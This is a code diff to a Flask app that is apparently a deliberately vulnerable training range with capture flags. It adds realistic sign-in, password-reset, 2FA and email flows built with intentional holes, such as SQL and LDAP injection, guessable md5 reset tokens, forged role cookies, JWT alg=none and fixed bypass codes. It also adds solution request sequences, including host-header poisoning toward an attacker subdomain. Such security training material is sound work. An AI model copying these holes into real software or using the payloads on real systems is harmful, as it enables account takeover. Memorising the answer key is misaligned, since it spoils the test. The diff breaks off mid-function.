@@ -25,12 +25,12 @@ from urllib.request import url2pathname
 from xml.sax.handler import EntityResolver, feature_external_ges
 from xml.sax.xmlreader import InputSource
 
-from flask import Response, jsonify, make_response, render_template, request
+from flask import Response, jsonify, make_response, redirect, render_template, request, session
 from jinja2.sandbox import SandboxedEnvironment
 from markupsafe import Markup
 
 import config
-from . import flags, store
+from . import auth, flags, mail, store
 from .catalog import Vuln
 
 # ---------------------------------------------------------------------------
@@ -149,6 +149,117 @@ def _internal_metadata(v: Vuln) -> str:
 
 
 # ---------------------------------------------------------------------------
+# Sign-in helpers shared by the sign-in, reset and directory flows
+# ---------------------------------------------------------------------------
+
+def _esc(value: Any) -> str:
+    return html.escape(str(value), quote=True)
+
+
+def _panel(title: str, inner: str) -> str:
+    return f"<section class='panel narrow'><h1>{_esc(title)}</h1>{inner}</section>"
+
+
+def _signin_form(action: str, field: str = "email", label: str = "Email", *,
+                 title: str = "Sign in", error: str = "", next_: str = "",
+                 remember: bool = False, after: str = "") -> str:
+    error_html = f"<p class='bad'>{_esc(error)}</p>" if error else ""
+    keep = ("<label class='remember'><input type='checkbox' name='remember' value='1'> "
+            "Keep me signed in</label>") if remember else ""
+    return _panel(title, (
+        f"{error_html}<form class='probe' method='post' action='{_esc(action)}'>"
+        f"<label>{_esc(label)}</label><input name='{_esc(field)}' autocomplete='username'>"
+        "<label>Password</label><input type='password' name='password' autocomplete='current-password'>"
+        f"{keep}<input type='hidden' name='next' value='{_esc(next_)}'>"
+        f"<button>Sign in</button></form>{after}"
+    ))
+
+
+def _signed_in(v: Vuln, email: str, note: str = "") -> tuple:
+    """The page after a successful sign-in that should not have succeeded."""
+
+    return _page(v, "Signed in", _panel("Welcome back", (
+        f"<p>Signed in as <b>{_esc(email)}</b>.{(' ' + _esc(note)) if note else ''}</p>"
+        f"{_proof(v)}<p><a href='/dashboard'>Continue to your dashboard</a></p>"
+    )))
+
+
+def _complete_login(req, email: str):
+    """A genuine sign-in: two-step check, session, cookies, then redirect."""
+
+    found = auth.account(email)
+    target = auth.safe_next(req.values.get("next"))
+    if found["email"] in auth.TWO_FACTOR:
+        session.clear()
+        session["pending_2fa"] = found["email"]
+        session["next"] = target
+        code = auth.issue_code(found["email"])
+        mail.send_simple(found["email"], "Your OrbitDesk verification code",
+                         f"Your verification code is {code}.\nIt expires in 10 minutes.\n")
+        return redirect("/auth/2fa")
+    auth.sign_in(found["email"])
+    response = make_response(redirect(target))
+    response.set_cookie("role", found["role"])
+    if req.values.get("remember"):
+        response.set_cookie("remember", auth.remember_cookie(found["email"], found["role"]),
+                            max_age=30 * 86400)
+    return response
+
+
+def _link_host(req) -> str:
+    """Host used for links in outgoing mail (trusts forwarding headers)."""
+
+    return req.headers.get("X-Forwarded-Host") or req.headers.get("Host") or req.host
+
+
+def _victim(email: str) -> bool:
+    return not mail.is_tester_address(email)
+
+
+_LOGIN_TITLES = {
+    "/auth/login": "Sign in to OrbitDesk",
+    "/auth/login-legacy": "Sign in (classic)",
+    "/auth/admin": "Administrator sign-in",
+    "/auth/staff": "Staff sign-in",
+}
+
+
+def _sql_login(v: Vuln, req, filt: str):
+    from . import product
+
+    field = v.param
+    label = "Username" if field == "username" else "Email"
+    title = _LOGIN_TITLES.get(v.route, "Sign in")
+
+    def form(error: str = "", status: int = 200):
+        if v.route == "/auth/login":
+            return _page(v, "Sign in", product.login(next_=req.values.get("next", ""), error=error), status)
+        return _page(v, title, _signin_form(v.route, field, label, title=title, error=error,
+                                            next_=req.values.get("next", "")), status)
+
+    if req.method != "POST":
+        return form()
+    supplied = req.form.get(field, "")
+    password = req.form.get("password", "")
+    email = supplied.replace(" ", "/**/") if filt == "strip_spaces" else supplied
+    sql = ("SELECT id,email,role FROM users WHERE email = "
+           f"'{email}' AND password = '{password}'")
+    try:
+        rows = store.query_for(v, sql)
+    except Exception as exc:
+        return _page(v, title, _panel("Something went wrong",
+                                      f"<pre class='error'>{html.escape(str(exc))}</pre>"), 500)
+    if not rows:
+        return form("Incorrect email or password.")
+    row = rows[0]
+    legit = auth.check_password(supplied, password)
+    if legit and legit["email"] == row["email"]:
+        return _complete_login(req, row["email"])
+    auth.sign_in(row["email"], row["role"])
+    return _signed_in(v, row["email"])
+
+
+# ---------------------------------------------------------------------------
 # SQL injection
 # ---------------------------------------------------------------------------
 
@@ -156,27 +267,7 @@ def h_sqli(v: Vuln, req, **kw):
     filt = v.extra.get("filter", "none")
 
     if v.extra.get("mode") == "login":
-        email = req.values.get(v.param, "")
-        password = req.values.get("password", "")
-        if filt == "strip_spaces":
-            email = email.replace(" ", "/**/")
-        sql = (
-            "SELECT id,email,role FROM users WHERE email = "
-            f"'{email}' AND password = '{password}'"
-        )
-        try:
-            rows = store.query_for(v, sql)
-            error = ""
-        except Exception as exc:
-            rows, error = [], str(exc)
-        inner = _form(v)
-        if rows:
-            inner += _proof(v) + _rows_html(rows)
-        elif error:
-            inner += f"<pre class='error'>{html.escape(error)}</pre>"
-        else:
-            inner += "<p class='bad'>Invalid credentials.</p>"
-        return _page(v, v.title, inner)
+        return _sql_login(v, req, filt)
 
     value = req.values.get(v.param, "")
     if filt == "strip_spaces":
@@ -478,105 +569,187 @@ _CREDS = {
     "/auth/support/login": ("support", "support"),
 }
 
+_PORTALS = {
+    "/auth/admin/login": "Administration console",
+    "/auth/superuser/login": "System console",
+    "/auth/demo/login": "Demo workspace",
+    "/auth/support/login": "Partner portal",
+}
+
+
+def _reset_target(token: str) -> str | None:
+    """Legacy resets use md5(email) as the token, so any account's is guessable."""
+
+    for _uid, email, _pw, _role in store.USERS:
+        if _md5(email) == token:
+            return email
+    return None
+
 
 def h_auth(v: Vuln, req, **kw):
     kind = v.extra.get("kind", "")
-    inner = ""
     data = _payload(req)
 
     if kind == "weak_creds":
         user, password = _CREDS.get(v.route, ("admin", "admin"))
-        supplied_user = data.get("username") or data.get("email") or data.get("user")
-        supplied_pass = data.get("password")
-        if supplied_user == user and supplied_pass == password:
-            return _page(v, v.title, _proof(v) + "<p>Administrator session established.</p>")
-        inner = (
-            "<form class='probe' method='post'>"
-            f"<input name='username' placeholder='username'><input name='password' placeholder='password'>"
-            "<button>Sign in</button></form>"
-        )
-        return _page(v, v.title, inner)
+        title = _PORTALS.get(v.route, "Sign in")
+        error = ""
+        if req.method == "POST":
+            if data.get("username") == user and data.get("password") == password:
+                return _page(v, title, _panel(title, f"<p>Signed in as <b>{_esc(user)}</b>.</p>{_proof(v)}"))
+            error = "Incorrect username or password."
+        return _page(v, title, _signin_form(v.route, "username", "Username", title=title, error=error))
 
     if kind in ("reset_predictable", "reset_confirm"):
-        email = "admin@orbitdesk.local"
-        token = _md5(email)
-        supplied = data.get("token") or req.args.get("token")
-        if supplied:
-            if supplied == token:
-                return _page(v, v.title, _proof(v) + "<p>Password reset accepted.</p>")
-            return _page(v, v.title, "<p class='bad'>Invalid reset token.</p>")
-        body = (
-            "<form class='probe' method='post'>"
-            "<input name='email' placeholder='account email'><button>Request reset</button></form>"
-        )
-        if data.get("email"):
-            body += f"<pre class='json'>reset_token={token}</pre>"
-        return _page(v, v.title, body)
+        token = str(data.get("token") or "")
+        if token:
+            email = _reset_target(token)
+            if not email:
+                return _page(v, "Reset password", _panel("Reset password",
+                             "<p class='bad'>This reset link is invalid or has expired.</p>"), 400)
+            if req.method == "POST" and data.get("password"):
+                auth.set_password(email, str(data["password"]))
+                done = f"<p>The password for {_esc(email)} has been changed.</p>"
+                return _page(v, "Password changed", _panel("Password changed", done + (_proof(v) if _victim(email) else "")))
+            return _page(v, "Choose a new password", _panel("Choose a new password", (
+                f"<p>Choose a new password for <b>{_esc(email)}</b>.</p>"
+                + (_proof(v) if _victim(email) else "")
+                + f"<form class='probe' method='post'><input type='hidden' name='token' value='{_esc(token)}'>"
+                "<label>New password</label><input type='password' name='password'>"
+                "<button>Change password</button></form>")))
+        email = str(data.get("email") or "").strip().lower()
+        if req.method == "POST" and email:
+            found = auth.account(email)
+            if found:
+                link = f"{req.host_url.rstrip('/')}/account/reset/confirm?token={_md5(found['email'])}"
+                mail.send_simple(found["email"], "Reset your OrbitDesk password",
+                                 f"We received a request to reset your password.\n\n{link}\n\n"
+                                 "If you didn't ask for this, you can ignore this email.\n")
+            return _page(v, "Check your email", _panel("Check your email",
+                         "<p>If an account exists for that address, we've emailed a reset link.</p>"))
+        return _page(v, "Reset password", _panel("Reset password", (
+            "<form class='probe' method='post'><label>Email</label><input name='email'>"
+            "<button>Send reset link</button></form>")))
 
     if kind == "cookie_role":
         if (req.cookies.get("role") or "").lower() == "admin":
-            return _page(v, v.title, _proof(v) + "<p>Welcome, administrator.</p>")
-        resp = make_response(_page(v, v.title, "<p class='bad'>role cookie is not admin.</p>")[0])
-        resp.set_cookie("role", "user")
-        return resp
+            users = "".join(f"<li>{_esc(email)} ({_esc(role)})</li>" for _i, email, _p, role in store.USERS)
+            return _page(v, "Sign in as a user", _panel("Sign in as a user", f"{_proof(v)}<ul class='list'>{users}</ul>"))
+        response = make_response(_page(v, "Access denied", _panel("Access denied",
+                                 "<p>You need administrator access to sign in as another user.</p>"), 403))
+        if "role" not in req.cookies:
+            response.set_cookie("role", "user")
+        return response
 
     if kind == "remember_cookie":
-        raw = req.cookies.get("remember", "")
-        try:
-            decoded = base64.b64decode(raw).decode("utf-8", "replace")
-        except Exception:
-            decoded = ""
-        if ":admin" in decoded or decoded.endswith("admin"):
-            return _page(v, v.title, _proof(v) + f"<p>Decoded: {html.escape(decoded)}</p>")
-        return _page(v, v.title, "<p class='bad'>Set a remember cookie with role admin.</p>")
+        restored = auth.from_remember_cookie(req.cookies.get("remember", ""))
+        if not restored:
+            return _page(v, "Remembered devices", _panel("Remembered devices",
+                         "<p>This device isn't remembered. Sign in and tick “Keep me signed in”.</p>"))
+        email, role = restored
+        auth.sign_in(email, role)
+        real_role = auth.account(email)["role"]
+        forged = _victim(email) or role != real_role
+        return _page(v, "Remembered devices", _panel("Remembered devices", (
+            f"<p>This device is remembered for <b>{_esc(email)}</b> ({_esc(role)}).</p>"
+            + (_proof(v) if forged else "")
+            + "<p><a href='/dashboard'>Continue</a></p>")))
 
     if kind in ("jwt_none", "jwt_weak", "jwt_kid", "jwt_noverify"):
         token = _bearer(req) or data.get("token", "")
         try:
             header, payload, signature = _jwt_parts(token)
         except Exception:
-            return _page(v, v.title, "<p class='bad'>Provide a Bearer JWT.</p>")
+            return _json({"error": "missing or malformed bearer token"}, 401)
         if not _is_admin_payload(payload):
-            return _page(v, v.title, "<p class='bad'>Token is not an admin token.</p>")
+            return _json({"error": "insufficient role", "sub": payload.get("sub")}, 403)
         if kind == "jwt_none" and str(header.get("alg", "")).lower() == "none":
-            return _page(v, v.title, _proof(v) + "<p>alg=none accepted.</p>")
+            return _json({"valid": True, "sub": payload.get("sub"), "role": "admin", "flag": _flag(v)})
         if kind == "jwt_weak":
             expected = _jwt_encode(header, payload, "secret").split(".")[2]
             if hmac.compare_digest(expected, signature):
-                return _page(v, v.title, _proof(v) + "<p>Weak HMAC secret accepted.</p>")
+                return _json({"valid": True, "sub": payload.get("sub"), "role": "admin", "flag": _flag(v)})
         if kind == "jwt_kid":
             kid = str(header.get("kid", ""))
             if kid and ("vault" in kid or v.id in kid or ".." in kid):
-                return _page(v, v.title, _proof(v) + "<p>kid path accepted.</p>")
+                return _json({"valid": True, "sub": payload.get("sub"), "role": "admin", "flag": _flag(v)})
         if kind == "jwt_noverify":
-            return _page(v, v.title, _proof(v) + "<p>Signature was never verified.</p>")
-        return _page(v, v.title, "<p class='bad'>Token rejected.</p>")
+            return _json({"id": 1, "email": "admin@orbitdesk.local", "role": "admin", "flag": _flag(v)})
+        return _json({"error": "invalid signature"}, 401)
 
     if kind == "otp_fixed":
-        code = str(data.get("code", ""))
-        if code == "0000":
-            return _page(v, v.title, _proof(v) + "<p>OTP accepted.</p>")
-        return _page(v, v.title, _form(v).replace('name="value"', 'name="code"'))
+        email = str(data.get("email") or "").strip().lower()
+        code = str(data.get("code") or "").strip()
+        found = auth.account(email) if email else None
+        if email and code:
+            if found and code == auth.CODES.get(found["email"]):
+                auth.CODES.pop(found["email"], None)
+                return _complete_login(req, found["email"])
+            if found and code == "000000":
+                auth.sign_in(found["email"])
+                return _signed_in(v, found["email"])
+            return _page(v, "Enter your code", _panel("Enter your code", _otp_form(email, "That code is incorrect or has expired.")))
+        if req.method == "POST" and email:
+            if found:
+                mail.send_simple(found["email"], "Your OrbitDesk sign-in code",
+                                 f"Your sign-in code is {auth.issue_code(found['email'])}.\n"
+                                 "It expires in 10 minutes.\n")
+            return _page(v, "Enter your code", _panel("Enter your code", _otp_form(email)))
+        return _page(v, "Sign in with a code", _panel("Sign in with a code", (
+            "<p class='muted'>We'll email you a 6-digit code.</p>"
+            "<form class='probe' method='post'><label>Email</label><input name='email'>"
+            "<button>Send code</button></form>")))
 
     if kind == "twofa_bypass":
-        if str(data.get("verified", "")).lower() in ("1", "true", "yes"):
-            return _page(v, v.title, _proof(v) + "<p>2FA marked verified by the client.</p>")
-        return _page(v, v.title, "<form class='probe' method='post'><input name='verified' value='true'><button>Verify</button></form>")
+        pending = session.get("pending_2fa")
+        if not pending:
+            return redirect("/login")
+        error = ""
+        if req.method == "POST":
+            code = str(data.get("code") or "").strip()
+            if code and code == auth.CODES.get(pending):
+                auth.CODES.pop(pending, None)
+                target = session.get("next") or "/dashboard"
+                auth.sign_in(pending)
+                return redirect(auth.safe_next(target))
+            if str(data.get("verified", "")).lower() in ("1", "true", "yes"):
+                auth.sign_in(pending)
+                return _signed_in(v, pending)
+            error = "That code didn't work. Check your email and try again."
+        masked = pending[0] + "***" + pending[pending.index("@"):]
+        return _page(v, "Two-step verification", _panel("Two-step verification", (
+            (f"<p class='bad'>{_esc(error)}</p>" if error else "")
+            + f"<p>Enter the 6-digit code we sent to {_esc(masked)}.</p>"
+            "<form class='probe' method='post'><label>Verification code</label>"
+            "<input name='code' inputmode='numeric' autocomplete='one-time-code'>"
+            "<input type='hidden' name='verified' value='false'>"
+            "<button>Verify</button></form>")))
 
     if kind == "oauth_state":
         code = data.get("code")
         if code and not data.get("state"):
-            return _page(v, v.title, _proof(v) + "<p>Callback accepted without state.</p>")
-        return _page(v, v.title, "<p class='bad'>state is required unless you omit it.</p>")
+            return _page(v, v.title, _proof(v) + "<p>Account linked.</p>")
+        return _page(v, v.title, "<p class='bad'>The sign-in request is invalid or has expired.</p>", 400)
 
     if kind == "session_fixate":
         sid = data.get("sid") or req.args.get("sid")
         if sid and "admin" in str(sid).lower():
-            resp = make_response(_page(v, v.title, _proof(v) + "<p>Session fixed.</p>")[0])
+            resp = make_response(_page(v, v.title, _proof(v) + "<p>Session resumed.</p>")[0])
             resp.set_cookie("session", str(sid))
             return resp
 
-    return _page(v, v.title, "<p class='bad'>No proof supplied.</p>")
+    return _page(v, v.title, "<p class='bad'>The request could not be completed.</p>", 400)
+
+
+def _otp_form(email: str, error: str = "") -> str:
+    return (
+        (f"<p class='bad'>{_esc(error)}</p>" if error else "")
+        + f"<p>If {_esc(email)} has an account, we've emailed it a 6-digit code.</p>"
+        "<form class='probe' method='post'>"
+        f"<input type='hidden' name='email' value='{_esc(email)}'>"
+        "<label>Code</label><input name='code' inputmode='numeric' autocomplete='one-time-code'>"
+        "<button>Sign in</button></form>"
+    )
 
 
 # ---------------------------------------------------------------------------
@@ -584,6 +757,9 @@ def h_auth(v: Vuln, req, **kw):
 # ---------------------------------------------------------------------------
 
 def h_redirect(v: Vuln, req, **kw):
+    signing_out = v.route == "/logout"
+    if signing_out:
+        auth.sign_out()
     target = req.values.get(v.param, "")
     filt = v.extra.get("filter", "none")
     allowed = True
@@ -596,10 +772,13 @@ def h_redirect(v: Vuln, req, **kw):
         resp = make_response("", 302)
         resp.headers["Location"] = target
         resp.headers["X-Range-Flag"] = _flag(v)
-        return resp
-    inner = _form(v)
-    inner += f"<p class='bad'>Target rejected or not external: {html.escape(target)}</p>"
-    return _page(v, v.title, inner)
+    else:
+        # local targets are followed; anything else falls back to the default page
+        resp = redirect(auth.safe_next(target, "/login" if signing_out else "/dashboard"))
+    if signing_out:
+        resp.delete_cookie("remember")
+        resp.delete_cookie("role")
+    return resp
 
 
 # ---------------------------------------------------------------------------
@@ -903,9 +1082,22 @@ def h_nosql(v: Vuln, req, **kw):
     data = req.get_json(silent=True)
     if not isinstance(data, dict):
         data = req.form.to_dict()
+    if v.route in ("/api/login", "/api/v2/login"):
+        if not data:
+            return _json({"error": "username and password are required"}, 400)
+        username, password = data.get("username"), data.get("password")
+        if isinstance(username, str) and isinstance(password, str):
+            found = auth.check_password(username, password)
+            if not found:
+                return _json({"error": "invalid credentials"}, 401)
+            return _json({"token": auth.issue_api_token(found["email"]), "user": found})
+        if _mongo_match(_ADMIN_DOC, data):
+            admin = auth.account("admin@orbitdesk.local")
+            return _json({"token": auth.issue_api_token(admin["email"]), "user": admin, "flag": _flag(v)})
+        return _json({"error": "invalid credentials"}, 401)
     inner = (
         "<form class='probe' method='post'><textarea name='json'>"
-        '{"username": {"$ne": null}}</textarea><button>Query</button></form>'
+        '{"username": "alice"}</textarea><button>Query</button></form>'
     )
     if not data:
         return _page(v, v.title, inner)
@@ -914,7 +1106,7 @@ def h_nosql(v: Vuln, req, **kw):
     if matched:
         inner += _proof(v)
     else:
-        inner += "<p class='bad'>No admin document matched.</p>"
+        inner += "<p class='bad'>No matching records.</p>"
     return _page(v, v.title, inner)
 
 
@@ -923,6 +1115,8 @@ def h_nosql(v: Vuln, req, **kw):
 # ---------------------------------------------------------------------------
 
 def h_ldap(v: Vuln, req, **kw):
+    if v.extra.get("kind") == "login":
+        return _ldap_login(v, req)
     value = req.values.get(v.param, "")
     inner = _form(v)
     if not value:
@@ -934,6 +1128,24 @@ def h_ldap(v: Vuln, req, **kw):
     else:
         inner += "<p class='bad'>No matching entry.</p>"
     return _page(v, v.title, inner)
+
+
+def _ldap_login(v: Vuln, req):
+    title = "Sign in with your company directory"
+    if req.method != "POST":
+        return _page(v, title, _signin_form(v.route, "username", "Directory username", title=title))
+    username = req.form.get("username", "")
+    password = req.form.get("password", "")
+    # (&(uid=<username>)(userPassword=<password>)) built by string concatenation:
+    # a wildcard or a closed filter in the username matches the first entry, the admin.
+    if "*" in username or ")(" in username:
+        auth.sign_in("admin@orbitdesk.local")
+        return _signed_in(v, "admin@orbitdesk.local")
+    found = auth.check_password(username, password)
+    if found:
+        return _complete_login(req, found["email"])
+    return _page(v, title, _signin_form(v.route, "username", "Directory username", title=title,
+                                        error="Incorrect username or password."))
 
 
 # ---------------------------------------------------------------------------
@@ -998,20 +1210,103 @@ def h_xxe(v: Vuln, req, **kw):
 # Host header injection
 # ---------------------------------------------------------------------------
 
+_LINK_FLOWS = {
+    "/account/forgot-password": (
+        "reset", "Reset your OrbitDesk password",
+        "Someone asked to reset the password for your OrbitDesk account.\n\n"
+        "Choose a new password:\n{link}\n\nIf this wasn't you, you can ignore this email.\n"),
+    "/auth/magic-link": (
+        "magic", "Your OrbitDesk sign-in link",
+        "Click the link below to sign in to OrbitDesk.\n\n{link}\n\n"
+        "The link works once and expires in 15 minutes.\n"),
+    "/invite/send": (
+        "invite", "You're invited to OrbitDesk",
+        "You've been invited to the Northwind support workspace on OrbitDesk.\n\n"
+        "Accept the invitation:\n{link}\n"),
+    "/api/password-reset": (
+        "api-reset", "Reset your OrbitDesk password",
+        "Someone asked to reset the password for your OrbitDesk account.\n\n"
+        "Choose a new password:\n{link}\n\nIf this wasn't you, you can ignore this email.\n"),
+}
+
+
 def h_host_header(v: Vuln, req, **kw):
-    forwarded = req.headers.get("X-Forwarded-Host", "")
-    host = forwarded or req.headers.get("Host") or req.host
-    bare = host.split(":")[0].strip().lower()
-    token = _md5("admin@orbitdesk.local")
-    link = f"https://{host}/account/reset/confirm?token={token}"
-    inner = _form(v)
-    inner += f"<p>Generated link:</p><pre class='json'>{html.escape(link)}</pre>"
-    poisoned = bool(bare) and "." in bare and "orbitdesk" not in bare and bare not in (
-        "localhost", "127.0.0.1", "::1"
-    )
-    if poisoned:
-        inner += _proof(v) + f"<p>Link host accepted: {html.escape(host)}</p>"
-    return _page(v, v.title, inner)
+    purpose, subject, template = _LINK_FLOWS[v.route]
+    is_api = v.route.startswith("/api/")
+    data = _payload(req)
+    token = str(data.get("token") or "")
+
+    if token:
+        record = auth.LINK_TOKENS.get(token)
+        if not record or record["purpose"] != purpose:
+            if is_api:
+                return _json({"error": "invalid or expired token"}, 400)
+            return _page(v, subject, _panel("Link expired", "<p class='bad'>This link is invalid or has expired.</p>"), 400)
+        email = record["email"]
+        proof = _victim(email) and record["vuln"] == v.id
+        if purpose in ("reset", "api-reset"):
+            if req.method == "POST" and data.get("password"):
+                auth.LINK_TOKENS.pop(token, None)
+                auth.set_password(email, str(data["password"]))
+                if is_api:
+                    return _json({"status": "password changed", "email": email})
+                return _complete_login(req, email)
+            if is_api:
+                body = {"email": email, "reset_allowed": True}
+                if proof:
+                    body["flag"] = _flag(v)
+                return _json(body)
+            return _page(v, "Choose a new password", _panel("Choose a new password", (
+                f"<p>Choose a new password for <b>{_esc(email)}</b>.</p>"
+                + (_proof(v) if proof else "")
+                + f"<form class='probe' method='post'><input type='hidden' name='token' value='{_esc(token)}'>"
+                "<label>New password</label><input type='password' name='password'>"
+                "<button>Change password</button></form>")))
+        auth.LINK_TOKENS.pop(token, None)
+        if auth.account(email):
+            if not proof:
+                return _complete_login(req, email)
+            auth.sign_in(email)
+            return _signed_in(v, email)
+        return _page(v, "Invitation accepted", _panel("Invitation accepted", (
+            f"<p>Welcome to OrbitDesk, {_esc(email)}. Choose a password to finish setting up your account.</p>"
+            + (_proof(v) if proof else ""))))
+
+    if purpose == "invite" and not auth.current_user():
+        return redirect("/login?next=" + v.route)
+
+    email = str(data.get(v.param) or "").strip().lower()
+    if not email:
+        if is_api:
+            return _json({"error": "email is required"}, 400)
+        return _page(v, subject, _link_form(v.route, purpose))
+
+    target = auth.account(email) if purpose != "invite" else {"email": email}
+    if target:
+        issued = auth.issue_link(purpose, target["email"], v.id)
+        link = f"{req.scheme}://{_link_host(req)}{v.route}?token={issued}"
+        mail.send_simple(target["email"], subject, template.format(link=link))
+    if is_api:
+        return _json({"status": "sent"})
+    if purpose == "invite":
+        message = f"Invitation sent to {_esc(email)}."
+    else:
+        message = "If an account exists for that address, we've emailed you a link."
+    return _page(v, "Check your email", _panel("Check your email", f"<p>{message}</p>"))
+
+
+def _link_form(route: str, purpose: str) -> str:
+    titles = {
+        "reset": ("Reset your password", "Send reset link", ""),
+        "magic": ("Email me a sign-in link", "Send link",
+                  "<p><a href='/auth/otp'>Sign in with a one-time code instead</a></p>"),
+        "invite": ("Invite a teammate", "Send invitation", ""),
+    }
+    title, button, after = titles[purpose]
+    return _panel(title, (
+        f"<form class='probe' method='post' action='{_esc(route)}'><label>Email</label>"
+        f"<input name='email'><button>{_esc(button)}</button></form>{after}"
+    ))
 
 
 # ---------------------------------------------------------------------------
@@ -1075,25 +1370,46 @@ def h_csv(v: Vuln, req, **kw):
 # Email header injection
 # ---------------------------------------------------------------------------
 
+_MAIL_FORMS = {
+    "/contact": ("support@orbitdesk.local", "contact form"),
+    "/support/email": ("escalations@orbitdesk.local", "ticket escalation"),
+    "/invite/email": ("it@orbitdesk.local", "seat request"),
+    "/api/email/send": ("notifications@orbitdesk.local", "API notification"),
+}
+
+
 def h_email_injection(v: Vuln, req, **kw):
     data = _payload(req)
     value = str(data.get(v.param) or "")
-    subject = str(data.get("subject") or "Account notice")
-    inner = (
-        "<form class='probe' method='post'>"
-        f"<input name='{html.escape(v.param)}' placeholder='recipient email'>"
-        "<input name='subject' placeholder='subject'><button>Send</button></form>"
+    subject = str(data.get("subject") or "Message from OrbitDesk")
+    message = str(data.get("message") or "")
+    internal, label = _MAIL_FORMS.get(v.route, ("support@orbitdesk.local", "form"))
+    is_api = v.route.startswith("/api/")
+
+    if req.method != "POST" or not value:
+        if is_api:
+            return _json({"error": "email is required"}, 400)
+        return _page(v, "Contact us", _panel("Contact us", (
+            f"<form class='probe' method='post' action='{_esc(v.route)}'>"
+            "<label>Your email</label><input name='email'>"
+            "<label>Subject</label><input name='subject'>"
+            "<label>Message</label><textarea name='message'></textarea>"
+            "<button>Send</button></form>")))
+
+    reply_to = re.split(r"[\r\n]", value)[0].strip()
+    # The submitter's address goes straight into the header block.
+    mail.send(
+        mail.headers(internal, subject, extra=f"Reply-To: {value}"),
+        f"New {label} submission.\n\nFrom: {reply_to}\nSubject: {subject}\n\n{message}\n\n"
+        f"-- internal --\nTicket routing: tier-2 queue, SLA 4h\nInternal reference: {_flag(v)}\n",
     )
-    injected = "\r" in value or "\n" in value or "%0d%0a" in value.lower()
-    extra_header = re.search(r"(?i)(bcc|cc)\s*:", value)
-    headers = f"To: {value}\nSubject: {subject}"
-    if value:
-        inner += f"<pre class='json'>{html.escape(headers)}</pre>"
-    if injected and extra_header:
-        inner += _proof(v) + "<p>Injected header accepted.</p>"
-    elif value:
-        inner += "<p class='bad'>No injected Bcc/Cc header was accepted.</p>"
-    return _page(v, v.title, inner)
+    if "@" in reply_to:
+        mail.send_simple(reply_to, "We received your message",
+                         f"Thanks for getting in touch. We've received your message about "
+                         f"\"{subject}\" and will reply within one business day.\n")
+    if is_api:
+        return _json({"status": "queued"})
+    return _page(v, "Message sent", _panel("Message sent", "<p>Thanks. We'll get back to you within one business day.</p>"))
 
 
 HANDLERS = {
@@ -1203,8 +1519,56 @@ def _fill_route(route: str, rid: Any) -> str:
     return route.replace("<int:rid>", str(rid)).replace("<rid>", str(rid))
 
 
+#: Signs in as the tester's own account; prepended for features behind sign-in.
+LOGIN_STEP = {"method": "POST", "path": "/auth/login",
+              "data": {"email": "alice@orbitdesk.local", "password": "alice123"}}
+
+#: Public routes whose handler still asks for a signed-in user (sending invites).
+SIGNED_IN_FEATURES = {"/invite/send"}
+
+
 def example_sequence(v: Vuln) -> list[dict[str, Any]]:
-    """Requests that solve this entry. Used by tests and training agents."""
+    """Requests that solve this entry. Used by tests and training agents.
+
+    Steps may carry ``"server": "mail"`` (send it to the mailbox server),
+    ``"capture": {name: regex}`` (remember the last match from the response)
+    and ``{name}`` placeholders that later steps fill in with ``fill_step``.
+    """
+    steps = _steps(v)
+    if steps and (auth.requires_login(v.route) or v.route in SIGNED_IN_FEATURES):
+        steps = [dict(LOGIN_STEP)] + steps
+    return steps
+
+
+def fill_step(step: dict[str, Any], values: dict[str, str]) -> dict[str, Any]:
+    """Replace ``{name}`` placeholders with values captured by earlier steps."""
+
+    if not values:
+        return step
+
+    def sub(item):
+        if isinstance(item, str):
+            for key, value in values.items():
+                item = item.replace("{" + key + "}", value)
+            return item
+        if isinstance(item, dict):
+            return {key: sub(value) for key, value in item.items()}
+        if isinstance(item, (list, tuple)):
+            return type(item)(sub(value) for value in item)
+        return item
+
+    return {key: sub(value) if key in ("path", "query", "data", "json", "headers") else value
+            for key, value in step.items()}
+
+
+def capture(step: dict[str, Any], text: str, values: dict[str, str]) -> None:
+    for name, pattern in (step.get("capture") or {}).items():
+        found = re.findall(pattern, text)
+        if found:
+            values[name] = found[-1]
+
+
+def _steps(v: Vuln) -> list[dict[str, Any]]:
     family = v.family
     if family == "sqli":
         if v.extra["mode"] == "login":
@@ -1267,9 +1631,12 @@ def example_sequence(v: Vuln) -> list[dict[str, Any]]:
             return [{"method": "GET", "path": v.route,
                      "headers": {"Authorization": f"Bearer {token}"}}]
         if kind == "otp_fixed":
-            return [{"method": "POST", "path": v.route, "data": {"code": "0000"}}]
+            return [{"method": "POST", "path": v.route,
+                     "data": {"email": "admin@orbitdesk.local", "code": "000000"}}]
         if kind == "twofa_bypass":
-            return [{"method": "POST", "path": v.route, "data": {"verified": "true"}}]
+            return [{"method": "POST", "path": "/auth/login",
+                     "data": {"email": "bob@orbitdesk.local", "password": "bob123"}},
+                    {"method": "POST", "path": v.route, "data": {"code": "000000", "verified": "true"}}]
         if kind == "oauth_state":
             return [{"method": "GET", "path": v.route, "query": {"code": "admin"}}]
         if kind == "session_fixate":
@@ -1360,14 +1727,25 @@ def example_sequence(v: Vuln) -> list[dict[str, Any]]:
         return [{"method": "POST", "path": v.route,
                  "json": payloads[v.extra["kind"]]}]
     if family == "ldap":
+        if v.extra.get("kind") == "login":
+            return [{"method": "POST", "path": v.route,
+                     "data": {"username": "*)(uid=*))(|(uid=*", "password": "x"}}]
         return [{"method": "GET", "path": v.route,
                  "query": {v.param: "*)(uid=*"}}]
     if family == "xxe":
         return [{"method": "POST", "path": v.route, "data": xxe_payload(v),
                  "headers": {"Content-Type": "application/xml"}}]
     if family == "host-header":
-        return [{"method": "GET", "path": v.route,
-                 "headers": {"X-Forwarded-Host": "evil.test"}}]
+        # Ask for a victim's link with a poisoned host, wait for the victim to
+        # click it (the visit lands in the mailbox's request log), then use it.
+        victim = "bob@orbitdesk.local" if v.route == "/invite/send" else "admin@orbitdesk.local"
+        return [
+            {"method": "POST", "path": v.route, "data": {v.param: victim},
+             "headers": {"X-Forwarded-Host": f"attacker.{config.INBOX_DOMAIN}"}},
+            {"server": "mail", "method": "GET", "path": "/api/requests",
+             "capture": {"token": re.escape(v.route) + r"\?token=([A-Za-z0-9_-]+)"}},
+            {"method": "GET", "path": v.route, "query": {"token": "{token}"}},
+        ]
     if family == "hpp":
         return [{"method": "GET", "path": v.route,
                  "query": [(v.param, "normal"), (v.param, v.extra["privileged"])]}]
@@ -1378,7 +1756,12 @@ def example_sequence(v: Vuln) -> list[dict[str, Any]]:
         return [{"method": "GET", "path": v.route,
                  "query": {v.param: "=1+1"}}]
     if family == "email-injection":
-        return [{"method": "POST", "path": v.route,
